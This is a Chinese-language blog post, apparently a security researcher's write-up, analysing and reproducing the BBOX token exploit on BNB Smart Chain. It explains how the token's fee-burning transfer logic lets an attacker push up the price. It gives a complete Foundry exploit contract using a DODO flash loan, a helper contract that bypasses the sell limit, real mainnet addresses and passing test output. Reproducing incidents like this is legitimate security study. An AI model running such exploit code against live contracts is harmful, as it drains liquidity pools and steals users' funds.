@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+    <!--Description-->
+
+    
+
+    
+        <meta name="description" content="简述部署在bsc上的bbox代币由于在实现_transfer函数时过于复杂，导致了漏洞的产生
+漏洞分析123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354"/>
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="d1rrick"/>
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="BBOX攻击事件分析与复现"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="简述部署在bsc上的bbox代币由于在实现_transfer函数时过于复杂，导致了漏洞的产生
+漏洞分析123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354"/>
+    
+
+    <!--Open Graph Site Name-->
+        <meta property="og:site_name" content="d1rrick&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article"/>
+    
+
+    <!--Page Cover-->
+    
+    
+        <meta property="og:image" content="http://example.comimg/home-bg.jpg"/>
+    
+
+        <meta name="twitter:card" content="summary_large_image"/>
+
+    
+
+    
+        <meta name="twitter:image" content="http://example.comimg/home-bg.jpg"/>
+    
+
+    <!-- Title -->
+    
+    <title>BBOX攻击事件分析与复现 - d1rrick&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet"/>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
+    <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
+    <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet"/>
+
+    <!-- Google Analytics -->
+    
+
+
+    <!-- favicon -->
+    
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Configurable Title</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                
+                    <li>
+                        <a href="/">
+                            
+                                Home
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/archives">
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a target="_blank" rel="noopener" href="https://github.com/HiT0on">
+                            
+                                <i class="fa fa-github fa-stack-2x"></i>
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('/img/home-bg.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>BBOX攻击事件分析与复现</h1>
+                    
+                    <span class="meta">
+                        <!-- Date and Author -->
+                        
+                        
+                            2023-01-05
+                        
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Tags and categories -->
+           
+                <div class="col-lg-4 col-lg-offset-2 col-md-5 col-md-offset-1 post-tags">
+                    
+                        
+
+
+<a href="/tags/区块链安全/">#区块链安全</a>
+
+
+                    
+                </div>
+                <div class="col-lg-4 col-md-5 post-categories">
+                    
+                </div>
+            
+
+            <!-- Gallery -->
+            
+
+            <!-- Post Main Content -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <h4 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h4><p>部署在bsc上的bbox代币由于在实现_transfer函数时过于复杂，导致了漏洞的产生</p>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">_transfer</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address <span class="keyword">from</span>,</span></span><br><span class="line"><span class="params">        address to,</span></span><br><span class="line"><span class="params">        uint256 amount</span></span><br><span class="line"><span class="params">    </span>) private &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="keyword">from</span> != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;ERC20: transfer from the zero address&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(amount &gt; <span class="number">0</span>, <span class="string">&quot;Transfer amount must be greater than zero&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( </span><br><span class="line">            !<span class="title function_">_isContract</span>(to) </span><br><span class="line">            &amp;&amp; _recommerMapping[to] == <span class="title function_">address</span>(<span class="number">0</span>) </span><br><span class="line">            &amp;&amp; amount &gt;= recommeCondition)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>( ammPairs[<span class="keyword">from</span>]  )&#123;</span><br><span class="line">                <span class="title function_">addRelationEx</span>(holder,to);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="title function_">addRelationEx</span>(<span class="keyword">from</span>,to);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bool isAddLiquidity;</span><br><span class="line">        bool isDelLiquidity;</span><br><span class="line">        ( isAddLiquidity, isDelLiquidity) = <span class="title function_">_isLiquidity</span>(<span class="keyword">from</span>,to);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( </span><br><span class="line">            pairAmountChange </span><br><span class="line">            &amp;&amp; !isAddLiquidity</span><br><span class="line">            &amp;&amp; pairAmount &gt; <span class="number">0</span> </span><br><span class="line">            &amp;&amp; !ammPairs[<span class="keyword">from</span>] </span><br><span class="line">            &amp;&amp; pairAmount &lt; <span class="title function_">balanceOf</span>(uniswapV2Pair))&#123;</span><br><span class="line"></span><br><span class="line">            uint v = pairAmount;</span><br><span class="line">            pairAmount = <span class="number">0</span>;</span><br><span class="line">            _tOwned[uniswapV2Pair] =  _tOwned[uniswapV2Pair].<span class="title function_">sub</span>(v);</span><br><span class="line">            _tOwned[<span class="title function_">address</span>(<span class="number">0</span>)] = _tOwned[<span class="title function_">address</span>(<span class="number">0</span>)].<span class="title function_">add</span>(v);</span><br><span class="line">            emit <span class="title class_">Transfer</span>(uniswapV2Pair, <span class="title function_">address</span>(<span class="number">0</span>), v);</span><br><span class="line"></span><br><span class="line">            <span class="title class_">IUniswapV</span>2Pair(uniswapV2Pair).<span class="title function_">sync</span>();</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        <span class="title class_">Param</span> memory param;</span><br><span class="line">        param.<span class="property">tTransferAmount</span> = amount;</span><br><span class="line">        param.<span class="property">user</span> = to;</span><br><span class="line"></span><br><span class="line">        bool takeFee = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>( </span><br><span class="line">            _isExcludedFromFee[<span class="keyword">from</span>] </span><br><span class="line">            || _isExcludedFromFee[to] </span><br><span class="line">            || isAddLiquidity </span><br><span class="line">            || to == <span class="title function_">address</span>(uniswapV2Router))&#123;</span><br><span class="line">            takeFee = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( takeFee &amp;&amp; ammPairs[<span class="keyword">from</span>] )&#123;</span><br><span class="line">            param.<span class="property">user</span> = to;</span><br><span class="line">            pairAmount += amount * <span class="number">3</span> / <span class="number">100</span>;</span><br><span class="line">            lastBuyTime[to] = block.<span class="property">timestamp</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( takeFee &amp;&amp; ammPairs[to] )&#123;</span><br><span class="line">            param.<span class="property">user</span> = <span class="keyword">from</span>;</span><br><span class="line">            pairAmount += amount * <span class="number">3</span> / <span class="number">100</span>;</span><br><span class="line">            <span class="built_in">require</span>(block.<span class="property">timestamp</span> &gt; lastBuyTime[<span class="keyword">from</span>] + sellSwapTimeLimit,<span class="string">&quot;sell limit time&quot;</span>);</span><br><span class="line">            <span class="built_in">require</span>(amount &lt;= <span class="title function_">balanceOf</span>(<span class="keyword">from</span>) * sellSwapLimitRate / <span class="number">100</span> ,<span class="string">&quot;sell limit amount&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( isAddLiquidity &amp;&amp;  <span class="title class_">IERC20</span>(uniswapV2Pair).<span class="title function_">totalSupply</span>() == <span class="number">0</span> &amp;&amp; ammPairs[to]  )&#123;</span><br><span class="line">            <span class="built_in">require</span>(<span class="keyword">from</span> == initPoolAddress,<span class="string">&quot;not allow&quot;</span>);</span><br><span class="line">        &#125;   </span><br><span class="line"></span><br><span class="line">        param.<span class="property">takeFee</span> = takeFee;</span><br><span class="line">        <span class="keyword">if</span>( takeFee )&#123;</span><br><span class="line">            <span class="title function_">_initParam</span>(amount,param);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="title function_">_tokenTransfer</span>(<span class="keyword">from</span>,to,amount,param);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fromAddress == <span class="title function_">address</span>(<span class="number">0</span>)) fromAddress = <span class="keyword">from</span>;</span><br><span class="line">        <span class="keyword">if</span> (toAddress == <span class="title function_">address</span>(<span class="number">0</span>)) toAddress = to;</span><br><span class="line">        <span class="keyword">if</span> ( !ammPairs[fromAddress] ) &#123;</span><br><span class="line">            <span class="title function_">setEst</span>(lpInterest,fromAddress);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( !ammPairs[toAddress] ) &#123;</span><br><span class="line">            <span class="title function_">setEst</span>(lpInterest,toAddress);</span><br><span class="line">        &#125;</span><br><span class="line">        fromAddress = <span class="keyword">from</span>;</span><br><span class="line">        toAddress = to;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( </span><br><span class="line">            <span class="keyword">from</span> != <span class="title function_">address</span>(<span class="variable language_">this</span>) </span><br><span class="line">            &amp;&amp; lpInterest.<span class="property">lastSendTime</span> + lpInterest.<span class="property">period</span> &lt; block.<span class="property">timestamp</span></span><br><span class="line">            &amp;&amp; lpInterest.<span class="property">award</span> &gt; <span class="number">0</span></span><br><span class="line">            &amp;&amp; lpInterest.<span class="property">award</span> &lt;= <span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>))</span><br><span class="line">            &amp;&amp; lpInterest.<span class="property">token</span>.<span class="title function_">totalSupply</span>() &gt; <span class="number">1e5</span>)&#123;</span><br><span class="line">            </span><br><span class="line">            lpInterest.<span class="property">lastSendTime</span> = block.<span class="property">timestamp</span>;</span><br><span class="line">            <span class="title function_">processEst</span>(lpInterest, distributorGas);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>转账函数中有一个pairAmount 用来记录每次发生交易该收3%的手续费，当from 和 to 都是合约时 会走进下面的代码逻辑，pair的代币数量会被减掉pairAmount  sync()后就相当于拉高了币价，攻击者在砸盘获利</p>
+<p><img src="/img/postimg/bbox/image-20230105163901624.png" alt="image-20230105163901624"></p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>注意代码里有卖出限制，需要新建一个合约来绕过这个限制</p>
+<p><img src="/img/postimg/bbox/image-20230105164324772.png" alt="image-20230105164324772"></p>
+<p>使用不同于买入地址进行卖出操作 from就是0 可以绕过这个require</p>
+<p><img src="/img/postimg/bbox/image-20230105164425691.png" alt="image-20230105164425691"></p>
+<p>攻击代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: UNLICENSED</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;forge-std/Test.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./interface.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;forge-std/console.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract bboxExploit is <span class="title class_">DSTest</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">IERC20</span> <span class="variable constant_">BBOX</span> = <span class="title class_">IERC20</span>(<span class="number">0x5DfC7f3EbBB9Cbfe89bc3FB70f750Ee229a59F8c</span>);</span><br><span class="line">    <span class="title class_">IERC20</span> <span class="variable constant_">WBNB</span> = <span class="title class_">IERC20</span>(<span class="number">0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c</span>);</span><br><span class="line">    <span class="title class_">Uni</span>_Router_V2 <span class="title class_">Router</span> = <span class="title class_">Uni</span>_Router_V2(<span class="number">0x10ED43C718714eb63d5aA57B78B54704E256024E</span>);</span><br><span class="line">    address dodo = <span class="number">0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4</span>;</span><br><span class="line">    address contractaddress;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="title class_">CheatCodes</span> cheats = <span class="title class_">CheatCodes</span>(<span class="number">0x7109709ECfa91a80626fF3989D68f67F5b1DD12D</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setUp</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        cheats.<span class="title function_">createSelectFork</span>(<span class="string">&#x27;bsc&#x27;</span>,<span class="number">23106506</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// function testFork() public &#123;</span></span><br><span class="line">    <span class="comment">//     assertEq(block.number,23106506);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">testExploit</span>(<span class="params"></span>) public&#123;</span><br><span class="line">        <span class="variable constant_">WBNB</span>.<span class="title function_">approve</span>(<span class="title function_">address</span>(<span class="title class_">Router</span>), <span class="title function_">type</span>(uint).<span class="property">max</span>);</span><br><span class="line">        <span class="variable constant_">BBOX</span>.<span class="title function_">approve</span>(<span class="title function_">address</span>(<span class="title class_">Router</span>), <span class="title function_">type</span>(uint).<span class="property">max</span>);</span><br><span class="line">        <span class="comment">// uint flashLoanAmount = WBNB.balanceOf(dodo);</span></span><br><span class="line">        <span class="title class_">TransferBBOXHelp</span> transferHelp = <span class="keyword">new</span> <span class="title class_">TransferBBOXHelp</span>();</span><br><span class="line">        contractaddress = <span class="title function_">address</span>(transferHelp);</span><br><span class="line">        <span class="title function_">DVM</span>(dodo).<span class="title function_">flashLoan</span>(<span class="number">1300</span>*<span class="number">1e18</span>,<span class="number">0</span>,<span class="title function_">address</span>(<span class="variable language_">this</span>),<span class="keyword">new</span> <span class="title function_">bytes</span>(<span class="number">1</span>));</span><br><span class="line">        emit <span class="title function_">log_named_decimal_uint</span>(</span><br><span class="line">            <span class="string">&quot;[End] Attacker WBNB balance after exploit&quot;</span>,</span><br><span class="line">            <span class="variable constant_">WBNB</span>.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)),</span><br><span class="line">            <span class="number">18</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">DPPFlashLoanCall</span>(<span class="params">address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data</span>) public&#123;</span><br><span class="line">        emit <span class="title function_">log_named_decimal_uint</span>(</span><br><span class="line">            <span class="string">&quot;[start] Attacker WBNB balance before exploit&quot;</span>,</span><br><span class="line">            <span class="variable constant_">WBNB</span>.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)),</span><br><span class="line">            <span class="number">18</span></span><br><span class="line">        );</span><br><span class="line">        <span class="title class_">WBNBToBBOX</span>();</span><br><span class="line">        <span class="comment">// BBOX.transfer(address(this),BBOX.balanceOf(address(this)));</span></span><br><span class="line">        contractaddress.<span class="title function_">call</span>(abi.<span class="title function_">encodeWithSignature</span>(<span class="string">&quot;transferBBOX()&quot;</span>));</span><br><span class="line">        <span class="title class_">BBOXToWBNB</span>();</span><br><span class="line">        <span class="variable constant_">WBNB</span>.<span class="title function_">transfer</span>(dodo,<span class="number">1300</span>*<span class="number">1e18</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">WBNBToBBOX</span>(<span class="params"></span>) internal&#123;</span><br><span class="line">        address [] memory path = <span class="keyword">new</span> address[](<span class="number">2</span>);</span><br><span class="line">        path[<span class="number">0</span>] = <span class="title function_">address</span>(<span class="variable constant_">WBNB</span>);</span><br><span class="line">        path[<span class="number">1</span>] = <span class="title function_">address</span>(<span class="variable constant_">BBOX</span>);</span><br><span class="line">        <span class="title class_">Router</span>.<span class="title function_">swapExactTokensForTokensSupportingFeeOnTransferTokens</span>(</span><br><span class="line">            <span class="number">1300</span> * <span class="number">1e18</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            path,</span><br><span class="line">            contractaddress,</span><br><span class="line">            block.<span class="property">timestamp</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">BBOXToWBNB</span>(<span class="params"></span>) internal&#123;</span><br><span class="line">        address [] memory path = <span class="keyword">new</span> address[](<span class="number">2</span>);</span><br><span class="line">        path[<span class="number">0</span>] = <span class="title function_">address</span>(<span class="variable constant_">BBOX</span>);</span><br><span class="line">        path[<span class="number">1</span>] = <span class="title function_">address</span>(<span class="variable constant_">WBNB</span>);</span><br><span class="line">        <span class="title class_">Router</span>.<span class="title function_">swapExactTokensForTokensSupportingFeeOnTransferTokens</span>(</span><br><span class="line">            <span class="variable constant_">BBOX</span>.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)) * <span class="number">90</span> / <span class="number">100</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            path,</span><br><span class="line">            <span class="title function_">address</span>(<span class="variable language_">this</span>),</span><br><span class="line">            block.<span class="property">timestamp</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">TransferBBOXHelp</span>&#123;</span><br><span class="line">    <span class="title class_">IERC20</span> <span class="variable constant_">BBOX</span> = <span class="title class_">IERC20</span>(<span class="number">0x5DfC7f3EbBB9Cbfe89bc3FB70f750Ee229a59F8c</span>);</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transferBBOX</span>(<span class="params"></span>) external&#123;</span><br><span class="line">        <span class="variable constant_">BBOX</span>.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>, <span class="variable constant_">BBOX</span>.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>输出如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Running 1 test for src/test/bboxexp.sol:bboxExploit</span><br><span class="line">[PASS] testExploit() (gas: 1123360)</span><br><span class="line">Logs:</span><br><span class="line">  [start] Attacker WBNB balance before exploit: 1300.000000000000000000</span><br><span class="line">  [End] Attacker WBNB balance after exploit: 38.435195424700962888</span><br><span class="line"></span><br><span class="line">Test result: ok. 1 passed; 0 failed; finished in 86.10ms</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://twitter.com/AnciliaInc/status/1599599614490877952">https://twitter.com/AnciliaInc/status/1599599614490877952</a></p>
+
+
+                
+            </div>
+
+            <!-- Comments -->
+            
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    
+
+
+                </div>
+            
+        </div>
+    </div>
+</article>
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    
+
+                    
+
+                    
+                        <li>
+                            <a href="https://github.com/HiT0on" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+
+                    
+                </ul>
+                <p class="copyright text-muted">&copy; 2023 d1rrick<br></p>
+                <p class="copyright text-muted">Original Theme <a target="_blank" href="http://startbootstrap.com/template-overviews/clean-blog/">Clean Blog</a> from <a href="http://startbootstrap.com/" target="_blank">Start Bootstrap</a></p>
+                <p class="copyright text-muted">Adapted for <a target="_blank" href="https://hexo.io/">Hexo</a> by <a href="http://www.codeblocq.com/" target="_blank">Jonathan Klughertz</a></p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
